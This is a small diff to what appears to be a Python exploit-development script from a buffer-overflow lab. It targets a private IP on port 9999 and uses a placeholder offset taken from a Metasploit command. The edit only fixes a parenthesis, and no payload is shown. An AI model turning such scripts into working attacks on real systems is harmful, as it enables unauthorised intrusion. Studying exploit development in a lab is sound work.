@@ -75,7 +75,7 @@ import sys, socket
 target_ip = '10.0.0.52'
 target_port = 9999
 
-offset = "(The value from the previous metasploit command"
+offset = "(The value from the previous metasploit command)"
 
 try:
 	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
